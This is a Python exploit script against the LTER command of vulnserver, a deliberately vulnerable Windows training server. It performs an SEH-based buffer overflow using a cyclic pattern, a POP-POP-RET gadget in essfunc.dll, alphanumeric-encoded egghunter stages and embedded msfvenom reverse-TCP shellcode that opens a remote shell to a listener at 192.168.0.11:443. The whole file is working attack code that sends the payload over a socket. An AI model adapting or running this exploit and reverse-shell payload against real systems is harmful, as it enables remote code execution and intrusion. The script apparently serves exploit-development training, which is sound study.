#!/usr/bin/python

import sys
import os
import socket

host = "192.168.0.12"
port = 9999

#!mona pc 5010
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9"
'''
#nSEH = 3494
#0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\gurana\Desktop\vulnserver-master\essfunc.dll)
#0x6250195e 
#00B7FFDC   EB 06            JMP SHORT 00B7FFE4
#after put into nSEH seems EB been modify, eb may be a bad char
#using conditional jmp 
#00B7FFDC   74 06            JE SHORT 00B7FFE4
#00B7FFDE   75 04            JNZ SHORT 00B7FFE4


alphanumeric limited char set only allow from \x01 - \x7f 
and reduce chars among \x80 with \x7f
short jmp reverse maximum 7F byte
'''

shellcode = "T00WT00W"
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.11 LPORT=443 -a x86 --platform windows -f python -b "\x00"
#Payload size: 351 bytes
shellcode += "\xba\xc9\x10\x66\xd4\xda\xde\xd9\x74\x24\xf4\x5e\x29"
shellcode += "\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x27\xec\x84"
shellcode += "\x21\x4b\xe5\xcb\xca\xb3\xf6\xab\x43\x56\xc7\xeb\x30"
shellcode += "\x13\x78\xdc\x33\x71\x75\x97\x16\x61\x0e\xd5\xbe\x86"
shellcode += "\xa7\x50\x99\xa9\x38\xc8\xd9\xa8\xba\x13\x0e\x0a\x82"
shellcode += "\xdb\x43\x4b\xc3\x06\xa9\x19\x9c\x4d\x1c\x8d\xa9\x18"
shellcode += "\x9d\x26\xe1\x8d\xa5\xdb\xb2\xac\x84\x4a\xc8\xf6\x06"
shellcode += "\x6d\x1d\x83\x0e\x75\x42\xae\xd9\x0e\xb0\x44\xd8\xc6"
shellcode += "\x88\xa5\x77\x27\x25\x54\x89\x60\x82\x87\xfc\x98\xf0"
shellcode += "\x3a\x07\x5f\x8a\xe0\x82\x7b\x2c\x62\x34\xa7\xcc\xa7"
shellcode += "\xa3\x2c\xc2\x0c\xa7\x6a\xc7\x93\x64\x01\xf3\x18\x8b"
shellcode += "\xc5\x75\x5a\xa8\xc1\xde\x38\xd1\x50\xbb\xef\xee\x82"
shellcode += "\x64\x4f\x4b\xc9\x89\x84\xe6\x90\xc5\x69\xcb\x2a\x16"
shellcode += "\xe6\x5c\x59\x24\xa9\xf6\xf5\x04\x22\xd1\x02\x6a\x19"
shellcode += "\xa5\x9c\x95\xa2\xd6\xb5\x51\xf6\x86\xad\x70\x77\x4d"
shellcode += "\x2d\x7c\xa2\xc2\x7d\xd2\x1d\xa3\x2d\x92\xcd\x4b\x27"
shellcode += "\x1d\x31\x6b\x48\xf7\x5a\x06\xb3\x90\xa4\x7f\xbb\x6b"
shellcode += "\x4d\x82\xbb\x6a\x36\x0b\x5d\x06\x58\x5a\xf6\xbf\xc1"
shellcode += "\xc7\x8c\x5e\x0d\xd2\xe9\x61\x85\xd1\x0e\x2f\x6e\x9f"
shellcode += "\x1c\xd8\x9e\xea\x7e\x4f\xa0\xc0\x16\x13\x33\x8f\xe6"
shellcode += "\x5a\x28\x18\xb1\x0b\x9e\x51\x57\xa6\xb9\xcb\x45\x3b"
shellcode += "\x5f\x33\xcd\xe0\x9c\xba\xcc\x65\x98\x98\xde\xb3\x21"
shellcode += "\xa5\x8a\x6b\x74\x73\x64\xca\x2e\x35\xde\x84\x9d\x9f"
shellcode += "\xb6\x51\xee\x1f\xc0\x5d\x3b\xd6\x2c\xef\x92\xaf\x53"
shellcode += "\xc0\x72\x38\x2c\x3c\xe3\xc7\xe7\x84\x13\x82\xa5\xad"
shellcode += "\xbb\x4b\x3c\xec\xa1\x6b\xeb\x33\xdc\xef\x19\xcc\x1b"
shellcode += "\xef\x68\xc9\x60\xb7\x81\xa3\xf9\x52\xa5\x10\xf9\x76"


total = 5010
nseh_offset = 3494

#/usr/share/metasploit-framework/tools/exploit/egghunter.rb -e "T00W" -b "\x00" -f python
egghunter =  ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += "\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75"
egghunter += "\xea\xaf\x75\xe7\xff\xe7"

stack = ""
stack += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
stack += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
stack += "\x54"			## push esp
stack += "\x58"			## pop eax
stack += "\x05\x40\x11\x01\x01" ## add eax, 0x01011146
stack += "\x05\x51\x01\x01\x01"	## add eax, 0x01010145
stack += "\x2d\x01\x01\x02\x02" ## sub eax, 0x02020101
# esp offset +1190 from the previous to our egghunter
stack += "\x50"			## push eax
stack += "\x5c"			## pop esp 29 bytes

egghunter1 = ""
egghunter1 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter1 += "\x05\x43\x64\x77\x64" ## add  eax, 0x64776443
egghunter1 += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
egghunter1 += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
egghunter1 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter1 += "\x50"                 ## push eax
#[*] Encoding [afea75af]..
#[!] Possible bad character found, using alterantive encoder..
egghunter1 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter1 += "\x05\x57\x43\x65\x57" ## add  eax, 0x57654357
egghunter1 += "\x05\x46\x33\x54\x46" ## add  eax, 0x46543346
egghunter1 += "\x05\x45\x32\x64\x45" ## add  eax, 0x45643245
egghunter1 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter1 += "\x50"                 ## push eax 62 bytes


egghunter2 = ""
#[*] Encoding [d7895730]..
#[+] No bad character found, using default encoder..
egghunter2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter2 += "\x05\x20\x33\x45\x73" ## add  eax, 0x73453320
egghunter2 += "\x05\x10\x24\x44\x64" ## add  eax, 0x64442410
egghunter2 += "\x50"                 ## push eax
#[*] Encoding [3054b8ef]..
#[!] Possible bad character found, using alterantive encoder..
egghunter2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter2 += "\x05\x67\x64\x33\x21" ## add  eax, 0x21336467
egghunter2 += "\x05\x56\x54\x32\x21" ## add  eax, 0x21325456
egghunter2 += "\x05\x65\x33\x22\x21" ## add  eax, 0x21223365
egghunter2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter2 += "\x50"                 ## push eax
#[*] Encoding [745a053c]..
#[+] No bad character found, using default encoder..
egghunter2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter2 += "\x05\x26\x03\x35\x32" ## add  eax, 0x32350326
egghunter2 += "\x05\x16\x02\x25\x42" ## add  eax, 0x42250216
egghunter2 += "\x50"                 ## push eax
#[*] Encoding [2ecd5802]..
#[+] No bad character found, using default encoder..
egghunter2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter2 += "\x05\x01\x34\x67\x17" ## add  eax, 0x17673401
egghunter2 += "\x05\x01\x24\x66\x17" ## add  eax, 0x17662401
egghunter2 += "\x50"                 ## push eax 94 bytes


egghunter3 = ""
#[*] Encoding [6a52420f]..
#[!] Possible bad character found, using alterantive encoder..
egghunter3 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter3 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter3 += "\x05\x17\x32\x32\x35" ## add  eax, 0x35323217
egghunter3 += "\x05\x16\x21\x31\x34" ## add  eax, 0x34312116
egghunter3 += "\x05\x15\x22\x22\x34" ## add  eax, 0x34222215
egghunter3 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter3 += "\x50"                 ## push eax 

#[*] Encoding [ffca8166]..
egghunter3 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
egghunter3 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
egghunter3 += "\x05\x33\x41\x65\x77" ## add  eax, 0x77654133
egghunter3 += "\x05\x33\x42\x54\x66" ## add  eax, 0x66544233
egghunter3 += "\x05\x33\x31\x44\x55" ## add  eax, 0x55443133
egghunter3 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
egghunter3 += "\x50"                 ## push eax 62 bytes



first = 122
nops = 118
#00B7FEDC   73 04            JNB SHORT 00B7FEE2
#00B7FF5C   72 02            JB SHORT 00B7FF60
#\x47 ascii as G alternative nops
jmp_forward = "\x73\x04\x47\x47"

#jmp reverse \x80 bytes 126 in decimal
jmp_back2 = "\x73\xff\x72\x02"

jmp_egg1 = stack + egghunter1 + "A" * (first - len(stack) - len(egghunter1)) + jmp_forward
jmp_egg2 = jmp_back2 + egghunter2 + "A" * (nops - len(egghunter2)) + jmp_forward
jmp_egg3 = jmp_back2 + egghunter3 + "A" * (nops - len(egghunter3)) + jmp_forward
'''
jmp_egg1 = "G"*122 + "B"*4
jmp_egg2 = jmp_back2 + "G"*nops + "B"*4
jmp_egg3 = jmp_back2 + "G"*nops + "B"*4
'''
print (len(jmp_egg1))
print (len(jmp_egg2))
print (len(jmp_egg3))
exploit = "LTER /.../"
exploit += "A" * (nseh_offset-(len(jmp_egg1)+ len(jmp_egg2) + len(jmp_egg3) + len(shellcode))) + shellcode + jmp_egg1 + jmp_egg2 + jmp_egg3 + jmp_back2 + "\x5e\x19\x50\x62" + "D" * (total-nseh_offset-8)


print (len(exploit))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print (s.recv(1024))

s.send(exploit)
print (s.recv(1024))
s.close()

